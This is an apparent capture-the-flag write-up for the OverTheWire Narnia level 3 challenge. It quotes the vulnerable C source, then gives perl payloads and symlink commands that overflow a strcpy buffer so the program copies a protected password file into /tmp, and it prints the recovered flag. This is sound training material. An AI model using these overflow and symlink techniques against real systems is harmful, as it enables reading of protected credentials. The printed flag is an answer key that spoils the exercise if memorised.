## Challenge Info

**Platform:** OverTheWire - Narnia
**Tags :** #Challenge #BinaryExploitation #BufferOverflow
**Completion Date & Time :** 2026 - 02 - 11 / 15:08

---
## FLAG : `CyWyf6uGWQ`

---
## Solution :

### Step 1 : Check for `narnia3.c`
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}

```
This program will try to copy a file (*path from out input*) to a destinated file `/dev/null`. After a few research, i found out that `/dev/null` is a special virtual device file on linux that functions like a blackhole. It will discard anything that is written on it. 
If we look closely, we could see an operation `strcpy(ifile, argv[1])`, this will copy the arguments to a variable `ifile`.
Here is the flow :
`read ifile(buffer) -> copy it -> save to ofile("/dev/null)`.

***Constrain*** :
- The `ifile` and `ofile` path must **EXIST**

If we just follow the flow above, our file content will never been saved. So, the idea is, since it use `strcpy` to copy the arguments to `ifile`, we could use this to change the content of `ofile` by using buffer overflow.

### Step 2 : Find `ifile` and `ofile` address.
Put a break after `strcpy`, and we use a 32 bytes payload :
```bash
perl -e 'print "A"x32'
```

Check for `$esp`, see this result :
```asm
0xffffd320:	'A' <repeats 32 times>
0xffffd341:	"dev/null"
```

So, the offset between `ifile` and `ofile` is about `0x20`.  Here is the plan :
1. Save the output file on `/tmp/owenlink`, make sure the string size is no more than 16 bytes.
2. We need a dummy address on `/tmp`, with total string size `32 bytes`. Here is the payload
```bash
perl -e 'print "/tmp/" . "A"x27 ' # 5bytes + 27 bytes = 32 bytes
```
So the correct path would be :
```bash
perl -e 'print "/tmp/" . "A"x27 . "/tmp/owenlink"'
```
3. Since the program would check wheter the file exist or not, this mean, the file path above must be exist. If we just use a random file, we won't get anything. So the idea is using `symlink` , the path above with *link* to `/etc/narnia_pass/narnia4`. This would be the `ifile`.
4. For `ofile`, we will make a blank file in `/tmp/owenlink`.

### Step 3 : Build `symlink` and `output` file.
First, we need to make sure that each folder was exist :
```bash
mkdir $(perl -e 'print "/tmp/" . "A"x27 ')
mkdir $(perl -e 'print "/tmp/" . "A"x27 . "/tmp" ')
```
As we mentioned in **Step 2**, we will link the file using this payload :
```bash
ln -s /etc/narnia_pass/narnia4 $(perl -e 'print "/tmp/" . "A"x27 . "/tmp/owenlink"')
```


Makesure the output file also exist :
```bash
touch "/tmp/owenlink"
```

### Step 4 : Execute 
```bash
/narnia/narnia3 $(perl -e 'print "/tmp/" . "A"x27 . "/tmp/owenlink"')
```

Here is the result :
```shell
narnia3@narnia:/narnia$ /narnia/narnia3 $(perl -e 'print "/tmp/" . "A"x27 . "/tmp/owenlink"')
copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/owenlink to a safer place... (/tmp/owenlink)
narnia3@narnia:/narnia$ cat /tmp/owenlink
CyWyf6uGWQ
```

---
### Key Takeaways : 
- Learn more about symlink


---
## Related Concepts : 
[[ln]], [[perl]], 

---
## Next Challenge :
[[Narnia (4 -> 5)]]


